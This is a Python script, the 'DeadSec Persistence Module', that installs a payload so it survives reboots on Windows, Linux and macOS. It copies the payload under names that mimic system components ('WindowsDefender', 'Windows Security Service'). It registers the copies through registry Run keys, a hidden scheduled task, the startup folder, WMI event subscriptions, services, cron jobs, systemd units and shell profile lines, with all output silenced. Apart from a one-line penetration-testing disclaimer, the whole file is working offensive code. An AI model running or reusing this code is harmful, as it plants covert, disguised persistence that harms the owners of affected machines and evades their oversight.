#!/usr/bin/env python3
"""
DeadSec Persistence Module
Advanced persistence mechanisms for maintaining access
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import os
import sys
import shutil
import subprocess
import platform
from pathlib import Path


class PersistenceManager:
    """Advanced persistence mechanisms"""
    
    def __init__(self, payload_path=None):
        self.payload_path = payload_path or sys.argv[0]
        self.os_type = platform.system().lower()
        self.methods = []
    
    def add_registry_run_key(self, name="WindowsDefender"):
        """Add registry Run key (Windows)"""
        if self.os_type != 'windows':
            return False
        
        try:
            # Copy payload to secure location
            appdata = os.environ.get('APPDATA')
            if not appdata:
                return False
            
            target_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'System')
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, f'{name}.exe')
            
            shutil.copy(self.payload_path, target_path)
            
            # Add to registry
            subprocess.run(
                f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{target_path}" /f',
                shell=True, check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            self.methods.append(f'Registry Run Key: {name}')
            print(f"[+] Registry Run key added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Registry Run key failed: {e}")
            return False
    
    def add_scheduled_task(self, name="WindowsUpdateCheck"):
        """Add scheduled task (Windows)"""
        if self.os_type != 'windows':
            return False
        
        try:
            # Copy payload
            appdata = os.environ.get('APPDATA')
            if not appdata:
                return False
            
            target_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Tasks')
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, f'{name}.exe')
            
            shutil.copy(self.payload_path, target_path)
            
            # Create scheduled task XML
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <StartBoundary>2025-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>{target_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            task_file = os.path.join(os.environ['TEMP'], f'{name}.xml')
            with open(task_file, 'w') as f:
                f.write(task_xml)
            
            # Create task
            subprocess.run(
                f'schtasks /create /tn "{name}" /xml "{task_file}" /f',
                shell=True, check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Clean up temp file
            try:
                os.remove(task_file)
            except:
                pass
            
            self.methods.append(f'Scheduled Task: {name}')
            print(f"[+] Scheduled task added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Scheduled task failed: {e}")
            return False
    
    def add_startup_folder(self, name="SystemService"):
        """Add to startup folder (Windows)"""
        if self.os_type != 'windows':
            return False
        
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            if not os.path.exists(startup_folder):
                return False
            
            target_path = os.path.join(startup_folder, f'{name}.exe')
            shutil.copy(self.payload_path, target_path)
            
            self.methods.append(f'Startup Folder: {name}')
            print(f"[+] Startup folder entry added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Startup folder failed: {e}")
            return False
    
    def add_wmi_event(self, name="SystemMonitor"):
        """Add WMI event subscription (Windows - Advanced)"""
        if self.os_type != 'windows':
            return False
        
        try:
            # Copy payload
            appdata = os.environ.get('APPDATA')
            if not appdata:
                return False
            
            target_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'WMI')
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, f'{name}.exe')
            
            shutil.copy(self.payload_path, target_path)
            
            # Create WMI event filter
            filter_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{name}Filter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"'''
            
            # Create WMI event consumer
            consumer_cmd = f'''wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{name}Consumer", CommandLineTemplate="{target_path}"'''
            
            # Bind filter to consumer
            binding_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='{name}Filter'", Consumer="CommandLineEventConsumer.Name='{name}Consumer'"'''
            
            for cmd in [filter_cmd, consumer_cmd, binding_cmd]:
                subprocess.run(cmd, shell=True, check=False,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            
            self.methods.append(f'WMI Event: {name}')
            print(f"[+] WMI event subscription added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] WMI event failed: {e}")
            return False
    
    def add_service(self, name="WindowsSecurityService"):
        """Add Windows service (Requires admin)"""
        if self.os_type != 'windows':
            return False
        
        try:
            # Copy payload
            system32 = os.environ.get('SystemRoot', 'C:\\Windows')
            target_path = os.path.join(system32, 'System32', f'{name}.exe')
            
            shutil.copy(self.payload_path, target_path)
            
            # Create service
            create_cmd = f'sc create "{name}" binPath= "{target_path}" start= auto DisplayName= "Windows Security Service"'
            subprocess.run(create_cmd, shell=True, check=False,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            # Start service
            start_cmd = f'sc start "{name}"'
            subprocess.run(start_cmd, shell=True, check=False,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            self.methods.append(f'Service: {name}')
            print(f"[+] Service added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Service creation failed: {e}")
            return False
    
    def add_cron_job(self, name="system_update"):
        """Add cron job (Linux/Mac)"""
        if self.os_type == 'windows':
            return False
        
        try:
            # Copy payload to hidden location
            home = str(Path.home())
            target_dir = os.path.join(home, '.config', 'systemd')
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, name)
            
            shutil.copy(self.payload_path, target_path)
            os.chmod(target_path, 0o755)
            
            # Add cron job
            cron_entry = f"@reboot {target_path}\n"
            cron_entry += f"*/30 * * * * {target_path}\n"  # Every 30 minutes
            
            # Get existing crontab
            try:
                result = subprocess.run(['crontab', '-l'], 
                                      capture_output=True, text=True, check=False)
                existing_crontab = result.stdout
            except:
                existing_crontab = ""
            
            # Add our entry if not already there
            if target_path not in existing_crontab:
                new_crontab = existing_crontab + cron_entry
                
                # Write new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                process.communicate(new_crontab.encode())
            
            self.methods.append(f'Cron Job: {name}')
            print(f"[+] Cron job added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Cron job failed: {e}")
            return False
    
    def add_systemd_service(self, name="system-monitor"):
        """Add systemd service (Linux)"""
        if self.os_type != 'linux':
            return False
        
        try:
            # Copy payload
            target_path = f'/usr/local/bin/{name}'
            shutil.copy(self.payload_path, target_path)
            os.chmod(target_path, 0o755)
            
            # Create service file
            service_content = f'''[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart={target_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
'''
            
            service_file = f'/etc/systemd/system/{name}.service'
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'], check=False,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['systemctl', 'enable', name], check=False,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['systemctl', 'start', name], check=False,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.methods.append(f'Systemd Service: {name}')
            print(f"[+] Systemd service added: {name}")
            return True
            
        except Exception as e:
            print(f"[!] Systemd service failed: {e}")
            return False
    
    def add_bash_profile(self):
        """Add to bash profile (Linux/Mac)"""
        if self.os_type == 'windows':
            return False
        
        try:
            home = str(Path.home())
            target_path = os.path.join(home, '.local', 'bin', 'update_check')
            
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            shutil.copy(self.payload_path, target_path)
            os.chmod(target_path, 0o755)
            
            # Add to .bashrc
            bashrc_path = os.path.join(home, '.bashrc')
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'a') as f:
                    f.write(f'\n# System update check\n{target_path} &\n')
            
            # Add to .profile
            profile_path = os.path.join(home, '.profile')
            if os.path.exists(profile_path):
                with open(profile_path, 'a') as f:
                    f.write(f'\n# System update check\n{target_path} &\n')
            
            self.methods.append('Bash Profile')
            print(f"[+] Bash profile entry added")
            return True
            
        except Exception as e:
            print(f"[!] Bash profile failed: {e}")
            return False
    
    def install_all(self):
        """Install all applicable persistence methods"""
        print("\n" + "="*60)
        print("  DEADSEC PERSISTENCE INSTALLER")
        print("="*60 + "\n")
        
        success_count = 0
        
        if self.os_type == 'windows':
            methods = [
                self.add_registry_run_key,
                self.add_scheduled_task,
                self.add_startup_folder,
                self.add_wmi_event,
            ]
        else:  # Linux/Mac
            methods = [
                self.add_cron_job,
                self.add_bash_profile,
            ]
            
            if self.os_type == 'linux':
                methods.append(self.add_systemd_service)
        
        for method in methods:
            try:
                if method():
                    success_count += 1
            except:
                pass
        
        print("\n" + "="*60)
        print(f"[+] Installed {success_count}/{len(methods)} persistence methods")
        print("="*60 + "\n")
        
        if self.methods:
            print("Active persistence mechanisms:")
            for method in self.methods:
                print(f"  • {method}")
        
        return success_count > 0


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DeadSec Persistence Manager')
    parser.add_argument('--payload', help='Path to payload to persist')
    parser.add_argument('--method', choices=['registry', 'task', 'startup', 'wmi', 'service', 'cron', 'systemd', 'bash', 'all'],
                       default='all', help='Persistence method to use')
    
    args = parser.parse_args()
    
    pm = PersistenceManager(payload_path=args.payload)
    
    if args.method == 'all':
        pm.install_all()
    elif args.method == 'registry':
        pm.add_registry_run_key()
    elif args.method == 'task':
        pm.add_scheduled_task()
    elif args.method == 'startup':
        pm.add_startup_folder()
    elif args.method == 'wmi':
        pm.add_wmi_event()
    elif args.method == 'service':
        pm.add_service()
    elif args.method == 'cron':
        pm.add_cron_job()
    elif args.method == 'systemd':
        pm.add_systemd_service()
    elif args.method == 'bash':
        pm.add_bash_profile()


if __name__ == "__main__":
    main()
